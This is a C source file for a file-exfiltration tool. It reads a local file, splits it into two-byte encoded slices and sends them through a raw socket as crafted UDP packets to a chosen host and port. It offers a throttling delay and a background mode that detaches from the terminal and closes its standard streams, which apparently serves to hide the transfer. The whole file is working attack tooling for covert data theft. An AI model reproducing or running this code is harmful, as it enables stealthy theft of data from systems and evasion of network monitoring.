#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include "encoder.h"
#include "network.h"
#include "test.h"

#define MAX_BUFF 4096

int exfil_file(const char* path, const char* host, const int port);


/*
 * function:
 *    print_help
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 *    print usage information
 * */

void print_help(void) {
    puts("-[-v]ersion - current version\n"
         "-[-t]est    - run the test suite if compiled in debug mode\n"
         "-[-f]ile    - the path to the file to send\n"
         "-[-p]ort    - the server port to connect to\n"
         "-[-h]ost    - the host to connect to\n"
         "-[-d]elay   - seconds between messages\n"
         "--help      - this message\n");
}


/*
 * function:
 *    main
 *
 * return:
 *    int the status code of the program
 *
 * parameters:
 *    int argc the number of arguments
 *    char** argv the arguements as c strings
 *
 * notes:
 *  parses the args and sends the file
 * */

int main(int argc, char** argv) {
    int port         = 34854;
    int delay        = 1;
    const char* path = 0;
    const char* host = 0;
    int background   = 0;
    int choice;

    while (1) {
        int option_index = 0;

#ifndef NDEBUG
#define OPTSTR "bvtp:f:h:d:"
        static struct option long_options[]
            = {{"vbersion", no_argument, 0, 'v'}, {"background", no_argument, 0, 'b'},
                {"test", no_argument, 0, 't'}, {"file", required_argument, 0, 'f'},
                {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
                {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
#else
#define OPTSTR "vbp:f:h:d:"
        static struct option long_options[] = {{"version", no_argument, 0, 'v'},
            {"file", required_argument, 0, 'f'}, {"background", no_argument, 0, 'b'},
            {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
            {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
#endif

        choice = getopt_long(argc, argv, OPTSTR, long_options, &option_index);
        if (choice == -1)
            break;
        switch (choice) {
            case 'v':
                puts("v0.1");
                return EXIT_SUCCESS;
            case 'b':
                background = 1;
                break;
            case 'd':
                delay = atoi(optarg);
                break;
            case 'p':
                port = atoi(optarg);
                break;
            case 'f':
                path = optarg;
                break;
            case 'h':
                host = optarg;
                break;
#ifndef NDEBUG
            case 't':
                run_encoders_tests();
                return EXIT_SUCCESS;
#endif
            case '?':
            default:
                print_help();
                return EXIT_FAILURE;
        }
    }

    if (!host || !path || !port) {
        print_help();
        return EXIT_FAILURE;
    }

    if (background) {
        int ret;
        if ((ret = fork()) != 0) { //>0 its good <0 its bad but we cant do anything about it
            exit(0);
        }
        umask(0);
        fclose(stdin);
        fclose(stdout);
        fclose(stderr);

        if (setsid() < 0) {
            perror("setsid()");
            return EXIT_FAILURE;
        }
        if (chdir("/") < 0) {
            perror("chdir()");
            return EXIT_FAILURE;
        }
    }

    //exfil the file
    {
        struct sockaddr_storage storage;
        make_storage(&storage, host, port);
        int sfd;

        ensure((sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) != -1);

        encoder_frame_t enc;

        FILE* fp = fopen(path, "r");
        if (!fp) {
            perror("error opening file");
            return 1;
        }

        uint8_t buffer[MAX_BUFF + 1];

        size_t len = fread(buffer, sizeof(uint8_t), MAX_BUFF, fp);

        if (ferror(fp)) {
            fputs("error reading file", stderr);
        } else {
            buffer[len++] = '\0'; //just to be safe
        }

        fclose(fp);

        outbound_encoder_init(&enc, buffer, len, 2);

        struct timespec ns, rs;
        ns.tv_sec  = delay;
        ns.tv_nsec = 0;

        uint8_t slice[2];
        while (!encoder_finished(&enc)) {
            encoder_get_next(&enc, slice);
            insert_udp_slice(sfd, &storage, slice);
            nanosleep(&ns, &rs);
        }
    }
}
